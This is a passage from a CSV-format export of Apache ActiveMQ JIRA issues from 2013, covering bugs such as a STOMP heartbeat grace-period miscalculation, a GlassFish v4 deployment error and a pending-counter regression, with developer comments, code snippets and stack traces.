As the broker aggressively enforces the heart beat timeouts false failover attempts can result.

Apparently Apollo supports an error margin of 1.5x the configured heart beat. If it could be made configurable that would be even better! 
",,paulgale,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5168,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,342492,,,Tue Aug 20 21:28:02 UTC 2013,,,,,,,,,,,"0|i1n2dr:",342797,,,,,,,,,,,,,,,,,,,,,"14/Aug/13 20:20;tabish;Added transport options ""?transport.hbGracePeriodMultiplier"" which is used to add a user defined grace period to the read check interval indicated by the connecting STOMP client.   By default this value is set at 1.0 in order to keep backwards compat with clients that don't expect a grace period.  Can be set to values greater than 1.0f and the read check interval will be multiplied by this value.  ;;;","20/Aug/13 16:58;paulgale;I think something has gone awry here. This implementation of a 'grace period' doesn't really help. 

What I am observing, after configuring the grace period with a value of 1.5, is that when a client connects (simplified):

CONNECT
heart-beat:5000,0

the broker responds with:

CONNECTED
heart-beat:0,7500

which is incorrect. The grace period multiplier should NOT affect the broker's response. The broker should have responded with 5000. 

The client therefore honors the broker's inflated interval (per the STOMP spec) and sends a read check every 7500ms. 

The broker, meanwhile, applies the grace period multiplier, a second time, to its inflated read check interval. In this case, it now performs a read check every 11250ms (as shown in the DEBUG logging of the AbstractInactivityMonitor).

With the client idle the broker's activemq.log contains TRACE log entries that read ""A receive is in progress"" every 11250ms. I presume this is the ReadCheckTimer handling the read check sent from the client? If so, the log output could be a little more descriptive.



;;;","20/Aug/13 17:58;tabish;submit some unit tests. ;;;","20/Aug/13 21:17;paulgale;I have no idea how to write unit tests for ActiveMQ and this section of code in particular. 

Unfortunately I could not find any unit tests for this feature which is surprising given that it was added just the other day. How was it tested? It's a tad galling to be asked for some tests now.

I don't mind modifying existing tests though. However, my personal experience with the unit test codebase is that they're rather flaky; they almost never pass whenever I've tried to run them which doesn't exactly entice me into wanting to try now.

Nonetheless, from a quick analysis of the code it would appear that the offending code is in activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java at line 929:
\\
{code:java|borderStyle=solid}
    hbReadInterval = (long) (Long.parseLong(keepAliveOpts[0]) * hbGracePeriodMultiplier); // Wrong!
{code}

should be:
\\
{code:java|borderStyle=solid}
    hbReadInterval = (long) Long.parseLong(keepAliveOpts[0]); //  Honor the client's read interval
{code}

where keepAliveOpts[0] is the client specified heartbeat read-interval.

When the inactivity monitor's read check time is calculated it's done correctly:
\\
{code:java|borderStyle=solid}
StompInactivityMonitor monitor = this.stompTransport.getInactivityMonitor();
monitor.setReadCheckTime((long) (hbReadInterval * hbGracePeriodMultiplier));  // Correct
monitor.setInitialDelayTime(Math.min(hbReadInterval, hbWriteInterval));
monitor.setWriteCheckTime(hbWriteInterval);
monitor.startMonitoring();
{code}

{noformat}
Setup:    keepAliveOpts[0] = 5000, hbGracePeriodMultiplier = 1.5

Expected: hbReadInterval == 5000, monitor.getReadCheckTime() == 7500
Actual:   hbReadInterval == 7500, monitor.getReadCheckTime() == 11250
{noformat}
;;;","20/Aug/13 21:28;tabish;Already fixed earlier, should be in the latest nightly. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Application that uses activemq-camel fails deploying to GlassFish v4,AMQ-4673,12662462,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,schmke,schmke,07/Aug/13 19:12,23/Aug/13 21:28,14/Jul/23 05:43,23/Aug/13 21:28,5.6.0,,,,,5.9.0,,,Camel,,,,1,,,,,,,,,"I have an application that uses activemq-camel and deploys/works fine with GlassFish v3.  I tried to deploy the same application on GlassFish v4 and get this error:

remote failure: Error occurred during deployment: Exception while deploying the app [appname] : The lifecycle method [afterPropertiesSet] must not throw a checked exception. Related annotation information: annotation [@javax.annotation.PostConstruct()] on annotated element [public void org.apache.activemq.camel.component.CamelEndpointLoader.afterPropertiesSet() throws java.lang.Exception] of type [METHOD]. Please see server.log for more details.
Command deploy failed.

It appears that CamelEndpointLoader has a @PostConstruct method that throws an Exception and per the Java EE spec that isn't allowed.  Apparently GlassFish v3 was lenient but v4 is not.

Looking at the code, it is easy to fix.  The afterPropertiesSet method just needs to catch the exceptions from addQueue/addTopic and log them at the end of the method like it does earlier in the method.  If a failure to add these during the method should actually be considered a failure, then something like IllegalStateException or another unchecked exception should be thrown instead.

This fix has been tested and verified to get past the problem.","Mac OS X, Java 1.7.0_25, GlassFish v4",schmke,smsiebe,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Aug/13 19:13;schmke;CamelEndpointLoader.patch;https://issues.apache.org/jira/secure/attachment/12596692/CamelEndpointLoader.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,342465,,,Fri Aug 23 21:28:47 UTC 2013,,,,,,,Patch Available,,,,"0|i1n27r:",342770,,,,,,,,,,,,,,,,,,,,,"23/Aug/13 21:28;tabish;Made changes on trunk to fix this.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[JMS Client] Set the SNI field on SSL connections,AMQ-4672,12662394,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,07/Aug/13 14:41,28/Aug/13 13:51,14/Jul/23 05:43,28/Aug/13 13:51,,,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,342398,,,Wed Aug 28 13:51:26 UTC 2013,,,,,,,,,,,"0|i1n1sv:",342703,,,,,,,,,,,,,,,,,,,,,"28/Aug/13 13:51;chirino;Fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
REGRESSION: InvalidDestinationException should be thrown on Session.unsubscribe that has no sub,AMQ-4671,12662383,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,07/Aug/13 13:53,07/Aug/13 14:06,14/Jul/23 05:43,07/Aug/13 14:06,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,When calling unsubscribe on Session with invalid subscription as a parameter InvalidDestinationException should be thrown. AMQ-4000 fix broke this.  ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,342387,,,Wed Aug 07 14:06:26 UTC 2013,,,,,,,,,,,"0|i1n1qf:",342692,,,,,,,,,,,,,,,,,,,,,"07/Aug/13 14:06;tabish;fixed on trunk, needed to ensure the remove propagates past the advisory broker even if there is no subscription so that the proper exceptions are thrown. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DurableSubDelayedUnsubscribeTest.testProcess fails intermittently,AMQ-4670,12662339,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,07/Aug/13 10:58,07/Aug/13 14:53,14/Jul/23 05:43,07/Aug/13 14:53,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"This test fails intermittently as shown below. This occurs because the test assumes all clients have finished, where under certain circumstances there could still be one active client that is sleeping.

java.lang.AssertionError: should have only one inactiveSubscriber subscribed expected:<1> but was:<2>
	at org.junit.Assert.fail(Assert.java:88)
	at org.junit.Assert.failNotEquals(Assert.java:743)
	at org.junit.Assert.assertEquals(Assert.java:118)
	at org.junit.Assert.assertEquals(Assert.java:555)
	at org.apache.activemq.usecases.DurableSubDelayedUnsubscribeTest.testProcess(DurableSubDelayedUnsubscribeTest.java:131)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26)
	at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:309)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164)
	at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110)
	at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175)
	at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Aug/13 11:00;kearls;AMQ-4670.patch;https://issues.apache.org/jira/secure/attachment/12596585/AMQ-4670.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,342343,,,Wed Aug 07 14:52:15 UTC 2013,,,,,,,Patch Available,,,,"0|i1n1gn:",342648,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"07/Aug/13 14:52;tabish;Looks good, fix applied, test passed a couple times here. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover with client ack mode consumer can loose a message auto acked as a duplicate,AMQ-4665,12661415,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,02/Aug/13 15:38,07/Aug/13 13:42,14/Jul/23 05:43,07/Aug/13 13:42,5.8.0,,,,,5.9.0,,,JMS client,,,,0,clientAck,duplicate,failover,,,,,,"with a client ack consumer and failover after receipt but before message.ack can result in a missed message when the message is redispatched and auto acked as a duplicate.
Failover interrupt should clear dispatched and unconsumed messages so that they can get redelivered.
auto-acking a duplicate seems over eager. think best to poison pill and now that we can include a cause property it will be possible to differentiate.",,gtully,paulgale,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,341604,,,Wed Aug 07 13:42:16 UTC 2013,,,,,,,,,,,"0|i1mwx3:",341911,,,,,,,,,,,,,,,,,,,,,"07/Aug/13 13:42;gtully;fix in http://svn.apache.org/r1511307

auto ack on duplicate now replaced with poison ack with poison cause property set. Duplicates need to be flagged as problems in the normal case.
Client ack mode now allows replay b/c consumed and undelivered are rolledback in a failover interrupt.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Wrong name of the policy in advisoryForDelivery in Per Destination Policies page,AMQ-4658,12660365,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,emedvede,emedvede,29/Jul/13 11:16,29/Jul/13 13:58,14/Jul/23 05:43,29/Jul/13 13:58,,,,,,,,,Documentation,,,,0,,,,,,,,,"In the link 
http://activemq.apache.org/per-destination-policies.html describing policies advisoryForDelivery policy is called advisoryForDelivered, which should be called  advisoryForDelivery, as specified here 
http://activemq.apache.org/advisory-message.html",,emedvede,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,340557,,,Mon Jul 29 13:58:13 UTC 2013,,,,,,,,,,,"0|i1mqiv:",340875,,,,,,,,,,,,,,,,,,,,,"29/Jul/13 13:58;tabish;Fixed on site, will show after next refresh;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No match found for native code: META-INF/native/windows32/leveldbjni.dll,AMQ-4657,12660354,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,anubhav,anubhav,29/Jul/13 10:20,09/Aug/13 14:02,14/Jul/23 05:43,09/Aug/13 14:02,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"I get the following error while starting the Active MQ bundle under karaf on Windows 2012 Server 64 bit

Error executing command: Could not start bundle mvn:org.apache.activemq/activemq-osgi/5.8-SNAPSHOT in feature(s) activemq-client-5.8-SNAPSHOT: The bundle ""org.apache.activemq.activemq-osgi_5.8.0.SNAPSHOT [235]"" could not be resolved. Reason: No match found for native code: META-INF/native/windows32/leveldbjni.dll; processor=x86; osname=Win32, META-INF/native/windows64/leveldbjni.dll; processor=x86-64; osname=Win32, META-INF/native/osx/libleveldbjni.jnilib; osname=macosx, META-INF/native/linux32/libleveldbjni.so; processor=x86; osname=Linux, META-INF/native/linux64/libleveldbjni.so; processor=x86-64; osname=Linux, org/xerial/snappy/native/Linux/i386/libsnappyjava.so; processor=x86; osname=Linux, org/xerial/snappy/native/Mac/i386/libsnappyjava.jnilib; processor=x86; osname=macosx, org/xerial/snappy/native/Mac/x86_64/libsnappyjava.jnilib; processor=x86-64; osname=macosx,
org/xerial/snappy/native/Windows/amd64/snappyjava.dll; processor=x86-64; osname=Win32, org/xerial/snappy/native/Windows/x86/snappyjava.dll; processor=x86; osname=Win32
",on Windows 2012 Server 64bit,anubhav,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,340546,,,Fri Aug 09 14:02:33 UTC 2013,,,,,,,,,,,"0|i1mqgf:",340864,,,,,,,,,,,,,,,,,,,,,"31/Jul/13 21:55;tabish;Have you tested against a 5.9-SNAPSHOT;;;","09/Aug/13 14:02;tabish;The default LevelDB implementation for 5.9 is the Java based one, so this shouldn't be an issue any longer.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pending Queue Counter is incorrect when using durable topics,AMQ-4656,12660127,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,tabish,tabish,26/Jul/13 20:31,11/Mar/14 15:24,14/Jul/23 05:43,11/Mar/14 15:19,5.8.0,,,,,5.10.0,5.9.0,,Broker,,,,0,,,,,,,,,"When using a durable topics the Pending Queue Counter provides an incorrect value for pending messages.

Steps to recreate

Set up the durable subscriber

{noformat}
ant consumer -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Ddurable=true -Dmax=2
{noformat}

Stop the subscriber

Send 20 persistent messages

{noformat}
ant producer -Ddurable=true -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Dmax=20
{noformat}

Consume 2 messages

{noformat}
ant consumer -Durl=tcp://localhost:61616 -Dtopic=true -Dsubject=MYSUB -Ddurable=true -Dmax=2
{noformat}

View the counter stats.

The result is the following:

{noformat}
Pending Queue Size = 38
Dispatched Queue Size = 0
Dispatched Counter = 20
Enqueue Counter = 20
Dequeue Counter = 2
{noformat}
",,dejanb,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jul/13 20:41;tabish;AMQ4656Test.java;https://issues.apache.org/jira/secure/attachment/12594447/AMQ4656Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,340319,,,Tue Mar 11 15:19:59 UTC 2014,,,,,,,,,,,"0|i1mp2f:",340637,Regression,,,,,,,,,,,,,,,,,,,,"26/Jul/13 20:41;tabish;Test case that reproduces.;;;","07/Aug/13 14:40;dejanb;The first stab at fixing this is in svn revision 1511333. I changed the way keepDurableSubsActive works, by not stopping/starting the cursor when subscription (de)activates. This is a natural way in how this feature should work and also simplifies things a bit.



I verified the fix by running all tests with that has durable in the name, but we should wait for the full nightly build to see if something is broker.;;;","09/Aug/13 12:40;gtully;tests look good, no related regression;;;","11/Mar/14 15:11;gtully;there is an issue with the cast introduced in the fix for this issue.{code}javax.jms.JMSException: org.apache.activemq.broker.region.cursors.FilePendingMessageCursor cannot be cast to org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1408)
	at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1983)
	at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:275)
	at org.apache.activemq.ActiveMQTopicSubscriber.<init>(ActiveMQTopicSubscriber.java:117)
	at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1384)
	at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1320)
	at org.apache.activemq.bugs.AMQ4656Test.testDurableConsumerEnqueueCountWithZeroPrefetch(AMQ4656Test.java:102)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26)
	at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:309)
	at org.junit.runners.Suite.runChild(Suite.java:127)
	at org.junit.runners.Suite.runChild(Suite.java:26)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:309)
	at org.junit.runner.JUnitCore.run(JUnitCore.java:160)
	at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:77)
	at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:195)
	at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:63)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
Caused by: java.lang.ClassCastException: org.apache.activemq.broker.region.cursors.FilePendingMessageCursor cannot be cast to org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor
	at org.apache.activemq.broker.region.DurableTopicSubscription.activate(DurableTopicSubscription.java:164)
	at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:159)
	at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:400)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:244)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:97)
	at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:101)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:97)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:97)
	at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:102)
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:618)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83){code} will add a trivial fix and test because this is a regression. It is not clear when the file pending message cursor is advisable, but if folks have a good reason we don't want to break their existing config. ;;;","11/Mar/14 15:19;gtully;fix and test variant for file pending message cursor in http://git-wip-us.apache.org/repos/asf/activemq/commit/6aaf859d;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
We should run JoramJmsTests with amqp+ssl,AMQ-4655,12660069,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,26/Jul/13 14:19,08/Aug/13 13:45,14/Jul/23 05:43,08/Aug/13 13:45,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"We should run the JoramJmsTests using amqp+ssl.

I will attach a patch.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jul/13 14:34;kearls;AMQ-4655.patch;https://issues.apache.org/jira/secure/attachment/12594406/AMQ-4655.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,340261,,,Thu Aug 08 13:45:52 UTC 2013,,,,,,,,,,,"0|i1mopr:",340579,,,,,,,,,,,,,,,,,,,,,"26/Jul/13 15:21;tabish;patch applied, thanks. ;;;","08/Aug/13 13:26;kearls;Hi Tim,

It looks like providerSSL.properties did not get added, can you take care of that?

Kevin
;;;","08/Aug/13 13:45;tabish;done, sorry about that.  Could have sworn I committed that, thanks for checking up on me.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages consumed in a TX from AMQP client are not removed from the Queue,AMQ-4651,12659868,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,25/Jul/13 18:26,31/Jul/13 22:06,14/Jul/23 05:43,31/Jul/13 22:06,5.8.0,,,,,5.9.0,,,Broker,Transport,,,0,,,,,,,,,Consumers using the QPid JMS client reading from a Queue in a TX aren't removing consumed messages from the Queue.,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,340060,,,Wed Jul 31 22:06:42 UTC 